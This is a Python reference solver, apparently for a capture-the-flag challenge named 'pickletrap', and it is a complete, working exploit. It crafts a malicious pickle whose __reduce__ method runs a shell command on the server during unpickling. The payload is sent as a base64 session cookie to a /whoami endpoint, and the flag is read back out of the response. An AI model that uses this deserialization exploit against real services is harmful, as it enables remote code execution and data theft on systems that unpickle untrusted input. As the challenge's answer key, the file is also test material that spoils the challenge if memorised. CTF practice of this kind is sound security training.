"""Reference solver for pickletrap: RCE via a malicious pickle __reduce__.

    python3 solve.py <host> <port>

Builds a pickle whose reduction calls subprocess.check_output to print the FLAG
environment variable, base64-encodes it as the `session` cookie, and reads the
result back from /whoami (the server str()s the unpickled object into the reply).
"""
import base64
import json
import pickle
import subprocess
import sys
import urllib.request


class Exploit:
    def __reduce__(self):
        # run at unpickle time on the server; its return value becomes the object
        return (subprocess.check_output, (["sh", "-c", "printf %s \"$FLAG\""],))


def main():
    host, port = sys.argv[1], sys.argv[2]
    base = f"http://{host}:{port}"
    payload = base64.b64encode(pickle.dumps(Exploit())).decode()
    req = urllib.request.Request(base + "/whoami",
                                 headers={"Cookie": f"session={payload}"})
    data = json.loads(urllib.request.urlopen(req, timeout=10).read())
    sess = data.get("session", "")
    # server returned str(bytes) e.g. b'flag{...}'; pull the flag out
    start = sess.find("flag{")
    end = sess.find("}", start)
    print(sess[start:end + 1] if start >= 0 else sess)


if __name__ == "__main__":
    main()
